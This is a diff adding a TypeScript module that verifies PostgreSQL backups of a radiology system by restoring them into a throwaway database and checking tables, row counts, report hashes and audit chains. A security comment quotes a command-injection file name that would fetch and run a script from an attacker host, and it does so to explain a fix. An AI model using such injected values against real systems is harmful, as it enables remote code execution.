@@ -1,0 +1,683 @@
+/**
+ * restoreVerification.ts — Ticket BEND-1 Phase 8: PROOF that a backup
+ * restores. A "success" in backup_job_logs only ever attested that a dump
+ * file was produced; this workflow proves the dump actually restores:
+ *
+ *   dump exists → size > 0 → sha256 recorded → gzip/decrypt integrity →
+ *   restore into a THROWAWAY database → core radiology tables exist →
+ *   row counts cover every source row up to the restored tables' own high-water
+ *   ids → signed structured reports survive the jsonb round-trip AND their
+ *   content hashes still verify → amendment chains stay linear → audit-chain
+ *   linkage verifies → throwaway dropped.
+ *
+ * NEVER touches production data: it only CREATEs/DROPs `restore_verify_*`
+ * databases and reads the source. Results persist to radiology_ops_checks so
+ * health reports the latest restore proof. Runs as an admin-triggered durable
+ * job (or the standalone script wrapper) — never automatically over anything.
+ */
+
+import { spawn } from "node:child_process";
+import { createHash } from "node:crypto";
+import { createReadStream, createWriteStream, promises as fs } from "node:fs";
+import os from "node:os";
+import path from "node:path";
+import { pipeline } from "node:stream/promises";
+import { createGunzip } from "node:zlib";
+import { Pool } from "pg";
+import { db } from "@workspace/db";
+import { radiologyOpsChecksTable } from "@workspace/db/schema";
+import { sql } from "drizzle-orm";
+import { verifyChainRows } from "./audit";
+import { decryptBackupToSql } from "./backupCrypto";
+import { verifyContentSha256 } from "./structuredReport/hash";
+import type { StructuredReportDocument } from "./structuredReport/types";
+
+export interface RestoreVerificationStep {
+  name: string;
+  ok: boolean;
+  detail: string;
+  /**
+   * Present only on a step that could not be exercised. `ok: true` on such a step
+   * means "nothing failed", NOT "this was proved" — the distinction is what keeps
+   * an artifact written before the backup-time census existed from being credited
+   * as a census-bearing one. Anything other than "verified" is reported onward as
+   * unverified and the preflight gate answers UNKNOWN, never PASS.
+   */
+  evidence?: "verified" | "unverified";
+}
+
+export interface RestoreVerificationResult {
+  ok: boolean;
+  steps: RestoreVerificationStep[];
+  /** Steps that ran but could not be exercised. Never quoted as proof. */
+  unverified: string[];
+  /**
+   * True only when every core table's completeness was bracketed by the census the
+   * backup job took. The preflight gate turns this into PASS versus UNKNOWN: an
+   * older proof that restored perfectly still cannot say what the database held at
+   * the moment the dump was taken.
+   */
+  censusAttested: boolean;
+  throwawayDb: string | null;
+  ranAt: string;
+  durationMs: number;
+}
+
+/**
+ * Tables the restore proof requires inside the THROWAWAY restored database.
+ * Deliberately radiology-integrity oriented — NOT the same list as the live
+ * smoke check `db.critical_tables` (users/patients/bills/…).
+ *
+ * A live PASS on critical tables + a restore FAIL on core_tables_exist is
+ * therefore expected when the backup artifact is unrestorable (e.g. DATA-ONLY)
+ * even though production itself is healthy.
+ */
+export const RESTORE_CORE_TABLES = [
+  "patient_reports",
+  "radiology_report_drafts",
+  "patient_report_amendments",
+  "report_finding_instances",
+  "radiology_worklist",
+  "audit_logs",
+  "radiology_redelivery_obligations",
+] as const;
+
+/** @deprecated Use RESTORE_CORE_TABLES — kept as alias for existing imports. */
+export const CORE_TABLES = RESTORE_CORE_TABLES;
+
+/**
+ * The monotonic column each core table is bounded by when its completeness is
+ * judged. Every one of these ids comes from a sequence, so a row's id is allocated
+ * when it is inserted and never changes — which makes the restored table's own
+ * highest id the exact line between "the artifact had to contain this" and "this
+ * arrived after the artifact was taken".
+ *
+ * A core table missing from this map FAILS the verification rather than being
+ * skipped, because a silently unbount table is a check that no longer exists.
+ */
+export const RESTORE_ROW_COUNT_MARKERS: Record<string, string> = {
+  patient_reports: "id",
+  radiology_report_drafts: "id",
+  patient_report_amendments: "id",
+  report_finding_instances: "id",
+  radiology_worklist: "id",
+  audit_logs: "id",
+  radiology_redelivery_obligations: "id",
+};
+
+/**
+ * Sequence-generated ids and column names here are all lower-case SQL identifiers,
+ * so anything else is a bug or an attack — and the count queries interpolate these
+ * directly (drizzle's sql.raw has no parameter slots for identifiers). Exported
+ * because it is the only thing standing between the marker map and a query string.
+ */
+export function quoteRestoreIdentifier(name: string): string {
+  if (!/^[a-z_][a-z0-9_]*$/.test(name)) {
+    throw new Error(`refusing to build a count query around ${JSON.stringify(name)}`);
+  }
+  return `"${name}"`;
+}
+
+export type RestoreCountReaders = {
+  /** Rows in the restored throwaway table, and its own highest marker value. */
+  restored(table: string, marker: string): Promise<{ count: number; highWater: number }>;
+  /** Source rows whose marker is at or below `highWater` — the rows the artifact had to contain. */
+  sourceThrough(table: string, marker: string, highWater: number): Promise<number>;
+  /** All source rows. Asked only when the restored table came back empty. */
+  sourceTotal(table: string): Promise<number>;
+};
+
+/**
+ * Did the artifact contain the data it was supposed to?
+ *
+ * This used to compare the restored counts with the LIVE database's counts taken
+ * now, minutes after the dump — so every bill, audit row and signed report written
+ * since the artifact was taken made the restored table look short, and a perfect
+ * restore failed on a busy clinic box. Bounding the source at the restored table's
+ * own high-water id removes that: the artifact is required to hold everything that
+ * existed when it was taken, and rows created afterwards cannot fail it.
+ *
+ * The genuine guarantees stay: a truncated or empty restore still fails, and a
+ * table whose bound cannot be computed fails loudly instead of passing quietly.
+ *
+ * One residual window is stated rather than hidden. Sequence values are allocated at
+ * insert time, so a transaction that took id 998 and committed *after* the dump
+ * snapshot, while a later id 999 committed before it, leaves the source holding a row
+ * `<= highWater` that the artifact legitimately lacks. That fails this step. It is
+ * kept strict because the only alternative is a tolerance, and a tolerance is exactly
+ * how a truncated restore starts passing; the numbers in the failure line are what a
+ * human needs to tell the two apart.
+ */
+export async function evaluateRowCountSanity(
+  tables: readonly string[],
+  readers: RestoreCountReaders,
+): Promise<RestoreVerificationStep> {
+  const problems: string[] = [];
+  const bounded: string[] = [];
+  for (const table of tables) {
+    const marker = RESTORE_ROW_COUNT_MARKERS[table];
+    if (!marker) {
+      problems.push(`${table}: no high-water column is declared, so its completeness cannot be proved — failing rather than skipping it`);
+      continue;
+    }
+    const { count, highWater } = await readers.restored(table, marker);
+    const required = await readers.sourceThrough(table, marker, highWater);
+    if (count < required) {
+      problems.push(`${table}: restored ${count} rows but the source holds ${required} with ${marker} <= ${highWater}, so ${(required - count).toLocaleString("en-US")} row(s) the artifact already had are missing`);
+    } else if (count === 0) {
+      const total = await readers.sourceTotal(table);
+      if (total > 0) problems.push(`${table}: restored empty while the source holds ${total.toLocaleString("en-US")} row(s) — the artifact carried no rows for it`);
+      else bounded.push(`${table} 0/0`);
+    } else {
+      bounded.push(`${table} ${count.toLocaleString("en-US")}/${highWater.toLocaleString("en-US")}`);
+    }
+  }
+  return {
+    name: "row_count_sanity",
+    ok: problems.length === 0,
+    detail: problems.length
+      ? problems.join("; ").slice(0, 500)
+      : `restored covers every source row up to its own id high-water mark; rows written since the artifact was taken are excluded from the comparison — ${bounded.join(", ")}`,
+  };
+}
+
+/**
+ * What one table looked like at one instant: how many rows, the oldest and newest
+ * sequence id, and the sum of those ids. Four numbers, one scan.
+ */
+export type CensusSample = { rows: number; minId: number; maxId: number; idSum: number };
+
+/**
+ * The census the backup job takes. `before` and `after` bracket the `pg_dump`, and
+ * the dump's contents are a consistent snapshot somewhere inside that bracket — so
+ * the artifact is required to sit between them, and neither number has to be
+ * re-derived from the live database months later.
+ *
+ * Why this exists beside `evaluateRowCountSanity`: a high-water mark is a property
+ * of the database as it is NOW. If a migration rebuilds a table and its ids restart
+ * at 1, if history is deleted, or if the artifact being restored is from a different
+ * database that happens to have a plausible top id, the bound is still computable
+ * and still satisfied while meaning nothing. A census recorded at dump time cannot
+ * drift, and it sees row loss the cardinality comparison cannot.
+ */
+export type BackupCensus = {
+  tables: Record<string, { before: CensusSample; after: CensusSample | null }>;
+  /** Set when the job could not take the census, so the absence has a reason. */
+  error: string | null;
+  present: boolean;
+};
+
+/**
+ * The single query the backup job runs. Exported so the shell script and the
+ * verifier can be pinned to mean the same thing by "census" — two definitions of a
+ * proof is how a check quietly stops being one.
+ *
+ * `sum()` over a bigint returns numeric in PostgreSQL, so the id sum cannot overflow
+ * the way a hand-rolled int8 accumulator would.
+ */
+export function censusSql(tables: readonly string[], marker = "id"): string {
+  return tables
+    .map((t) => {
+      const q = quoteRestoreIdentifier(t);
+      const m = quoteRestoreIdentifier(marker);
+      return `SELECT '${t}' AS census_table, count(*)::bigint AS row_count, coalesce(min(${m}), 0)::bigint AS id_min, coalesce(max(${m}), 0)::bigint AS id_max, coalesce(sum(${m}), 0)::numeric AS id_sum FROM ${q}`;
+    })
+    .join(" UNION ALL ");
+}
+
+const CENSUS_LINE = /^census_(before|after)\.([a-z_][a-z0-9_]*)=(\d+)\|(\d+)\|(\d+)\|(\d+)$/;
+
+/**
+ * Parse the `.meta` sidecar's census block. Anything malformed is dropped rather
+ * than guessed at, and a half-present bracket (an `after` that never arrived) stays
+ * a half-present bracket, because the bracket is the whole argument.
+ */
+export function parseBackupCensus(metaText: string | null | undefined): BackupCensus {
+  const out: BackupCensus = { tables: {}, error: null, present: false };
+  if (!metaText) return out;
+  for (const raw of metaText.split(/\r?\n/)) {
+    const line = raw.trim();
+    if (line.startsWith("census_error=")) {
+      out.error = line.slice("census_error=".length).trim() || "reported without a reason";
+      continue;
+    }
+    const m = CENSUS_LINE.exec(line);
+    if (!m) continue;
+    const [, which, table, rows, minId, maxId, idSum] = m;
+    const sample: CensusSample = { rows: Number(rows), minId: Number(minId), maxId: Number(maxId), idSum: Number(idSum) };
+    const entry = out.tables[table] ?? { before: sample, after: null };
+    if (which === "before") entry.before = sample;
+    else entry.after = sample;
+    out.tables[table] = entry;
+    out.present = true;
+  }
+  return out;
+}
+
+export type CensusReaders = { restored(table: string): Promise<CensusSample> };
+
+/**
+ * Did the artifact contain the rows the database had when the dump was taken?
+ *
+ * Three answers, not two. A mismatch is FAIL and blocks. A table the census never
+ * covered leaves the step `unverified` rather than failing the restore: the artifact
+ * may predate this evidence, and a healthy clinic box must not go red for a reason
+ * nobody can fix without a time machine. `unverified` is reported as such, so
+ * nothing may call it proved.
+ */
+export async function evaluateBackupCensus(
+  tables: readonly string[],
+  census: BackupCensus,
+  readers: CensusReaders,
+): Promise<RestoreVerificationStep> {
+  if (!census.present) {
+    return {
+      name: "backup_census_match",
+      ok: true,
+      evidence: "unverified",
+      detail: `no backup-time census in this artifact's .meta${census.error ? ` (the job reported: ${census.error})` : ""} — completeness is judged by the high-water bound alone, which cannot see history deleted after the dump`,
+    };
+  }
+  const problems: string[] = [];
+  const matched: string[] = [];
+  const skipped: string[] = [];
+  for (const table of tables) {
+    const c = census.tables[table];
+    if (!c) {
+      skipped.push(table);
+      continue;
+    }
+    const now = await readers.restored(table);
+    const hi = c.after ?? c.before;
+    const faults: string[] = [];
+    if (now.rows < c.before.rows) faults.push(`holds ${now.rows} of the ${c.before.rows} rows the database had when the dump started`);
+    if (now.rows > hi.rows) faults.push(`holds ${now.rows} rows, more than the ${hi.rows} present when the dump finished — this artifact is not from that moment`);
+    if (now.minId !== c.before.minId) faults.push(`oldest id ${now.minId} where the census recorded ${c.before.minId}: history moved`);
+    if (now.maxId < c.before.maxId || now.maxId > hi.maxId) faults.push(`newest id ${now.maxId} outside the bracket ${c.before.maxId}..${hi.maxId}`);
+    if (now.idSum < c.before.idSum || now.idSum > hi.idSum) faults.push(`id sum ${now.idSum} outside the bracket ${c.before.idSum}..${hi.idSum}`);
+    if (faults.length) problems.push(`${table}: ${faults.join("; ")}`);
+    else matched.push(`${table} ${now.rows.toLocaleString("en-US")}`);
+  }
+  const evidence = problems.length === 0 && skipped.length === 0 && matched.length > 0 ? "verified" : "unverified";
+  return {
+    name: "backup_census_match",
+    ok: problems.length === 0,
+    evidence,
+    detail: problems.length
+      ? problems.join("; ").slice(0, 500)
+      : `${matched.length}/${tables.length} table(s) bracketed by the census taken at dump time${skipped.length ? `; NOT CENSUSED: ${skipped.join(", ")}` : ""} — ${matched.join(", ")}`,
+  };
+}
+
+/**
+ * True only when every table the restore is judged on carried backup-time evidence.
+ * Persisted so the preflight gate can tell a census-bearing proof from an older
+ * green tick that cannot say what the database looked like when it was taken.
+ */
+export function censusAttested(census: BackupCensus, tables: readonly string[]): boolean {
+  return tables.every((t) => Boolean(census.tables[t]?.before));
+}
+
+/**
+ * True when SQL looks schema-complete (contains CREATE TABLE).
+ * DATA-ONLY fallback dumps emit TRUNCATE + INSERT only — they restore into an
+ * empty throwaway DB with zero tables, which previously surfaced only as the
+ * opaque `core_tables_exist` failure after a misleading `psql_restore` PASS
+ * (psql exits 0 without ON_ERROR_STOP even when every statement errors).
+ */
+export function sqlArtifactHasCreateTable(sqlText: string): boolean {
+  return /^\s*CREATE\s+TABLE\b/im.test(sqlText);
+}
+
+/** Pure evaluation of which restore-core tables are present (unit-tested). */
+export function evaluateCoreTablesPresent(foundTableNames: Iterable<string>): RestoreVerificationStep {
+  const found = new Set([...foundTableNames].map((t) => t.toLowerCase()));
+  const missing = RESTORE_CORE_TABLES.filter((t) => !found.has(t.toLowerCase()));
+  return {
+    name: "core_tables_exist",
+    ok: missing.length === 0,
+    detail: missing.length ? `missing: ${missing.join(", ")}` : `${RESTORE_CORE_TABLES.length} tables present`,
+  };
+}
+
+export { classifyRestoreVerifyDashboardStatus } from "./restoreVerifyStatus";
+
+function run(cmd: string, args: string[], opts: { env?: NodeJS.ProcessEnv; stdin?: string } = {}):
+  Promise<{ code: number; stdout: string; stderr: string }> {
+  return new Promise((resolve) => {
+    const child = spawn(cmd, args, { env: opts.env ?? process.env });
+    let stdout = "";
+    let stderr = "";
+    child.stdout.on("data", (c) => { stdout += c; });
+    child.stderr.on("data", (c) => { stderr += c; });
+    child.on("error", (err) => resolve({ code: 127, stdout, stderr: String(err) }));
+    child.on("close", (code) => resolve({ code: code ?? 1, stdout, stderr }));
+    if (opts.stdin != null) { child.stdin.write(opts.stdin); }
+    child.stdin.end();
+  });
+}
+
+/**
+ * Exported so the probe file builds its `pg_dump`/`psql` invocations from the same
+ * parse the verifier uses. A second copy of this parse in the tests is how
+ * `restoreVerify.integration.test.ts` came to run `pg_dump` without a password:
+ * the verifier passed `PGPASSWORD`, the test built its own URL and forgot it, and
+ * trust authentication on the developer box hid the difference until CI.
+ */
+export function dbUrlParts(): { host: string; port: string; user: string; password: string; database: string } {
+  const url = new URL(process.env.DATABASE_URL ?? "");
+  return {
+    host: url.hostname,
+    port: url.port || "5432",
+    user: url.username,
+    password: url.password,
+    database: url.pathname.replace(/^\//, ""),
+  };
+}
+
+async function sha256File(filePath: string): Promise<string> {
+  const buf = await fs.readFile(filePath);
+  return createHash("sha256").update(buf).digest("hex");
+}
+
+/** Pure evaluation of the file-level preconditions (unit-tested). */
+export function evaluateBackupFile(stats: { exists: boolean; sizeBytes: number }): RestoreVerificationStep[] {
+  return [
+    {
+      name: "backup_file_exists",
+      ok: stats.exists,
+      detail: stats.exists ? "backup file present" : "backup file MISSING",
+    },
+    {
+      name: "backup_file_nonempty",
+      ok: stats.exists && stats.sizeBytes > 0,
+      detail: stats.exists ? `${stats.sizeBytes} bytes` : "n/a",
+    },
+  ];
+}
+
+export async function runRestoreVerification(
+  opts: { backupPath?: string; ranBy?: string } = {},
+): Promise<RestoreVerificationResult> {
+  const startedAt = Date.now();
+  const steps: RestoreVerificationStep[] = [];
+  const parts = dbUrlParts();
+  const throwawayDb = `restore_verify_${Date.now()}`;
+  const tempFiles: string[] = [];
+  let sqlPath: string | null = null;
+  let throwawayCreated = false;
+  let restoredPool: Pool | null = null;
+  // Set once the sidecar has been read. `finish()` lives outside the try block, so
+  // the census verdict has to be a variable rather than the step itself — and the
+  // default is the pessimistic one, because a run that died before reaching the
+  // census must not be recorded as a census-bearing proof.
+  let censusEvidence: "verified" | "unverified" = "unverified";
+
+  const step = (name: string, ok: boolean, detail: string) => {
+    steps.push({ name, ok, detail: detail.slice(0, 500) });
+    return ok;
+  };
+
+  try {
+    // 0. Obtain a dump (given path, or a fresh one from the OFFICIAL pg_dump
+    // recipe used by the internal-backup endpoint).
+    let backupPath = opts.backupPath ?? null;
+    if (!backupPath) {
+      const fresh = path.join(process.env.BACKUP_TEMP_DIR || os.tmpdir(), `restore_verify_${Date.now()}.sql`);
+      const dump = await run("pg_dump", [
+        "--host", parts.host, "--port", parts.port, "--username", parts.user,
+        "--dbname", parts.database, "--no-owner", "--no-privileges", "--clean", "--if-exists",
+        "--file", fresh,
+      ], { env: { ...process.env, PGPASSWORD: parts.password } });
+      tempFiles.push(fresh);
+      if (!step("dump_created", dump.code === 0, dump.code === 0 ? fresh : dump.stderr)) {
+        return finish(false);
+      }
+      backupPath = fresh;
+    }
+
+    // 1-2. Exists + non-empty.
+    const stat = await fs.stat(backupPath).catch(() => null);
+    for (const s of evaluateBackupFile({ exists: !!stat, sizeBytes: stat?.size ?? 0 })) {
+      steps.push(s);
+      if (!s.ok) return finish(false);
+    }
+
+    // 3. Checksum recorded (proof of WHAT was verified).
+    step("checksum", true, `sha256:${await sha256File(backupPath)}`);
+
+    // 4. Decrypt / decompress where configured.
+    //
+    // Delegated to lib/backupCrypto so this proof covers EVERY artifact the
+    // product has written. The previous inline openssl call only understood
+    // `openssl -aes-256-cbc + BACKUP_PASSPHRASE`, so it could not open the
+    // scheduler's own backups (AES-256-GCM keyed on SESSION_SECRET) and would
+    // fail the whole verification on a file that was, in fact, a valid backup.
+    // decryptBackupToSql tries both passphrases and both container formats.
+    sqlPath = backupPath;
+    if (!backupPath.endsWith(".gz")) {
+      try {
+        const dec = await decryptBackupToSql(backupPath, process.env.BACKUP_TEMP_DIR || os.tmpdir());
+        if (dec.producedTempFile) tempFiles.push(dec.sqlPath);
+        sqlPath = dec.sqlPath;
+        step("decrypt", true, dec.format === "plaintext" ? "not encrypted" : `decrypted (${dec.format}, key=${dec.keySource})`);
+      } catch (err) {
+        return finish(step("decrypt", false, err instanceof Error ? err.message : String(err)) && false);
+      }
+    }
+    if (sqlPath.endsWith(".gz")) {
+      const integrity = await run("gzip", ["-t", sqlPath]);
+      if (!step("gzip_integrity", integrity.code === 0, integrity.code === 0 ? "gzip -t OK" : integrity.stderr)) return finish(false);
+      const out = sqlPath.replace(/\.gz$/, "") + `.${Date.now()}.sql`;
+      // SECURITY (INJ-1): Use Node native zlib stream instead of `bash -c gunzip`.
+      // The previous `bash -c` call with JSON.stringify(sqlPath) was vulnerable to
+      // command injection — $() and backticks are interpreted by bash inside double
+      // quotes, so a backupPath like "$(curl attacker|sh).gz" would achieve RCE.
+      // The stream pipeline passes file paths as OS-level arguments with no shell.
+      try {
+        await pipeline(
+          createReadStream(sqlPath),
+          createGunzip(),
+          createWriteStream(out),
+        );
+      } catch (err) {
+        return finish(step("decompress", false, err instanceof Error ? err.message : String(err)) && false);
+      }
+      tempFiles.push(out);
+      if (!step("decompress", true, "decompressed via zlib stream")) return finish(false);
+      sqlPath = out;
+    }
+
+    // 4b. Refuse DATA-ONLY artifacts before touching a throwaway DB.
+    // Mirrors scripts/verify-backup-restore.sh §4 — without this, psql without
+    // ON_ERROR_STOP would exit 0 after failing every statement, and the only
+    // signal would be core_tables_exist (missing: …).
+    {
+      // Sample first 512 KiB only — real pg_dump emits CREATE TABLE in the
+      // schema section before COPY/INSERT data (avoids loading 100MB+ dumps).
+      const fh = await fs.open(sqlPath, "r");
+      try {
+        const buf = Buffer.alloc(512 * 1024);
+        const { bytesRead } = await fh.read(buf, 0, buf.length, 0);
+        const sample = buf.slice(0, bytesRead).toString("utf8");
+        if (!sqlArtifactHasCreateTable(sample)) {
+          return finish(
+            step(
+              "schema_complete_artifact",
+              false,
+              "DATA ONLY artifact — no CREATE TABLE (cannot rebuild empty DB; likely exportDatabaseSqlFallback). Re-take backup with pg_dump.",
+            ) && false,
+          );
+        }
+        step("schema_complete_artifact", true, "CREATE TABLE present");
+      } finally {
+        await fh.close().catch(() => undefined);
+      }
+    }
+
+    // 5. Restore into a THROWAWAY database (NEVER the live DATABASE_URL db name).
+    try {
+      await db.execute(sql.raw(`CREATE DATABASE ${throwawayDb}`));
+      throwawayCreated = true;
+      step("throwaway_created", true, throwawayDb);
+    } catch (err) {
+      return finish(step("throwaway_created", false, `CREATE DATABASE failed (needs CREATEDB): ${err instanceof Error ? err.message : String(err)}`) && false);
+    }
+    // ON_ERROR_STOP=1: a failed statement must fail the restore step. Without
+    // it, DATA-ONLY / broken dumps exit 0 and only fail later at core_tables.
+    const restore = await run("psql", [
+      "--host", parts.host, "--port", parts.port, "--username", parts.user,
+      "--dbname", throwawayDb, "--file", sqlPath, "--quiet",
+      "-v", "ON_ERROR_STOP=1",
+    ], { env: { ...process.env, PGPASSWORD: parts.password } });
+    if (!step("psql_restore", restore.code === 0, restore.code === 0 ? "restored into throwaway DB (not live)" : restore.stderr.slice(-400))) return finish(false);
+
+    // 6+. Checks inside the RESTORED throwaway database (explicit database=
+    // throwawayDb — never parts.database / live).
+    restoredPool = new Pool({
+      host: parts.host, port: Number(parts.port), user: parts.user,
+      password: parts.password, database: throwawayDb, max: 2,
+    });
+    // DROP DATABASE … WITH (FORCE) terminates backends; idle clients then emit
+    // unhandled 'error' (57P01) which fails Vitest even when checks passed.
+    restoredPool.on("error", (err: Error & { code?: string }) => {
+      if (err.code === "57P01") return;
+      console.warn("[restoreVerification] throwaway pool error:", err.message);
+    });
+
+    const present: string[] = [];
+    for (const table of RESTORE_CORE_TABLES) {
+      const r = await restoredPool.query("SELECT to_regclass($1) AS t", [`public.${table}`]);
+      if (r.rows[0]?.t) present.push(table);
+    }
+    {
+      const coreStep = evaluateCoreTablesPresent(present);
+      steps.push(coreStep);
+      if (!coreStep.ok) return finish(false);
+    }
+
+    // Row-count sanity, bounded by the restored tables' own high-water ids so a
+    // busy clinic cannot fail a perfect restore (see evaluateRowCountSanity).
+    const pool = restoredPool;
+    const countStep = await evaluateRowCountSanity(RESTORE_CORE_TABLES, {
+      async restored(table, marker) {
+        const r = await pool.query(
+          `SELECT count(*)::bigint AS c, COALESCE(max(${quoteRestoreIdentifier(marker)})::bigint, 0) AS hi FROM ${quoteRestoreIdentifier(table)}`,
+        );
+        return { count: Number(r.rows[0].c), highWater: Number(r.rows[0].hi) };
+      },
+      async sourceThrough(table, marker, highWater) {
+        const r = await db.execute(sql.raw(
+          `SELECT count(*)::bigint AS c FROM ${quoteRestoreIdentifier(table)} WHERE ${quoteRestoreIdentifier(marker)} <= ${Math.trunc(highWater)}`,
+        ));
+        return Number((r.rows[0] as { c: number | string }).c);
+      },
+      async sourceTotal(table) {
+        const r = await db.execute(sql.raw(`SELECT count(*)::bigint AS c FROM ${quoteRestoreIdentifier(table)}`));
+        return Number((r.rows[0] as { c: number | string }).c);
+      },
+    });
+    if (!step(countStep.name, countStep.ok, countStep.detail)) return finish(false);
+
+    // Backup-time census: what the database said it held while the dump was being
+    // taken, read from the sidecar that travelled with the artifact. This is the
+    // half of "complete" that the bound above cannot supply, because the bound is
+    // computed from the live database at verification time.
+    const metaPath = backupPath ? `${backupPath}.meta` : null;
+    const metaText = metaPath ? await fs.readFile(metaPath, "utf8").catch(() => null) : null;
+    const census = parseBackupCensus(metaText);
+    if (metaText === null) {
+      census.error = census.error ?? (metaPath ? `no ${path.basename(metaPath)} beside the artifact` : "no artifact path to look for a sidecar next to");
+    }
+    const censusStep = await evaluateBackupCensus(RESTORE_CORE_TABLES, census, {
+      async restored(table) {
+        const q = quoteRestoreIdentifier(table);
+        const m = quoteRestoreIdentifier(RESTORE_ROW_COUNT_MARKERS[table] ?? "id");
+        const r = await pool.query(
+          `SELECT count(*)::bigint AS c, coalesce(min(${m}), 0)::bigint AS lo, coalesce(max(${m}), 0)::bigint AS hi, coalesce(sum(${m}), 0)::numeric AS s FROM ${q}`,
+        );
+        const row = r.rows[0] ?? {};
+        return { rows: Number(row.c ?? 0), minId: Number(row.lo ?? 0), maxId: Number(row.hi ?? 0), idSum: Number(row.s ?? 0) };
+      },
+    });
+    steps.push(censusStep);
+    censusEvidence = censusStep.evidence ?? "unverified";
+    if (!censusStep.ok) return finish(false);
+
+    // Signed structured reports: jsonb round-trip + content hash verify.
+    const signed = await restoredPool.query(
+      "SELECT id, structured_json FROM patient_reports WHERE structured_json IS NOT NULL AND type = 'radiology' ORDER BY id",
+    );
+    const hashFailures: number[] = [];
+    for (const row of signed.rows) {
+      try {
+        const verdict = verifyContentSha256(row.structured_json as StructuredReportDocument);
+        if (!verdict.ok) hashFailures.push(Number(row.id));
+      } catch {
+        hashFailures.push(Number(row.id));
+      }
+    }
+    if (!step("structured_hashes_verify", hashFailures.length === 0,
+      hashFailures.length ? `hash FAILED after restore for reports ${hashFailures.slice(0, 10).join(",")}` : `${signed.rows.length} signed documents verified`)) return finish(false);
+
+    // Amendment chains stay linear (self-cycles / forks / merges / dangling).
+    const chainBad = await restoredPool.query(`
+      SELECT count(*)::int AS c FROM patient_report_amendments a
+      WHERE a.original_report_id = a.amended_report_id
+         OR EXISTS (SELECT 1 FROM patient_report_amendments b WHERE b.id <> a.id AND (b.original_report_id = a.original_report_id OR b.amended_report_id = a.amended_report_id))
+         OR NOT EXISTS (SELECT 1 FROM patient_reports p WHERE p.id = a.original_report_id)
+         OR NOT EXISTS (SELECT 1 FROM patient_reports p WHERE p.id = a.amended_report_id)`);
+    if (!step("amendment_chains_valid", Number(chainBad.rows[0].c) === 0,
+      Number(chainBad.rows[0].c) === 0 ? "chains linear + endpoints resolve" : `${chainBad.rows[0].c} corrupt linkage rows`)) return finish(false);
+
+    // Audit-chain linkage on the RESTORED data.
+    const auditRows = await restoredPool.query("SELECT id, previous_hash, chain_hash FROM audit_logs ORDER BY id ASC");
+    const audit = verifyChainRows(auditRows.rows.map((r) => ({ id: Number(r.id), previousHash: r.previous_hash, chainHash: r.chain_hash })));
+    if (!step("audit_chain_verifies", audit.ok, audit.ok ? `${audit.checked} rows linked` : `${audit.reason} (first broken id ${audit.firstBrokenId})`)) return finish(false);
+
+    return finish(true);
+  } catch (err) {
+    step("unexpected_error", false, err instanceof Error ? err.message : String(err));
+    return finish(false);
+  }
+
+  async function finish(ok: boolean): Promise<RestoreVerificationResult> {
+    if (restoredPool) {
+      const pool = restoredPool;
+      restoredPool = null;
+      // End before FORCE-drop so we do not race admin terminate vs open clients.
+      await pool.end().catch(() => undefined);
+    }
+    if (throwawayCreated) {
+      await db.execute(sql.raw(`DROP DATABASE IF EXISTS ${throwawayDb} WITH (FORCE)`)).then(
+        () => steps.push({ name: "throwaway_dropped", ok: true, detail: throwawayDb }),
+        (err) => steps.push({ name: "throwaway_dropped", ok: false, detail: String(err) }),
+      );
+    }
+    for (const f of tempFiles) await fs.unlink(f).catch(() => undefined);
+    const result: RestoreVerificationResult = {
+      ok: ok && steps.every((s) => s.ok),
+      steps,
+      unverified: steps.filter((s) => s.evidence === "unverified").map((s) => s.name),
+      censusAttested: censusEvidence === "verified",
+      throwawayDb: throwawayCreated ? throwawayDb : null,
+      ranAt: new Date().toISOString(),
+      durationMs: Date.now() - startedAt,
+    };
+    await db.insert(radiologyOpsChecksTable).values({
+      checkName: "restore_verification",
+      status: result.ok ? "pass" : "fail",
+      ranBy: opts.ranBy ?? "system",
+      detail: {
+        steps: result.steps,
+        throwawayDb: result.throwawayDb,
+        durationMs: result.durationMs,
+        // The gate reads this. A proof recorded before the backup job carried a
+        // census is a real pass over the data it could see, and it must not be
+        // quoted as evidence of completeness it never measured.
+        censusAttested: result.censusAttested,
+      },
+    }).catch(() => undefined);
+    return result;
+  }
+}
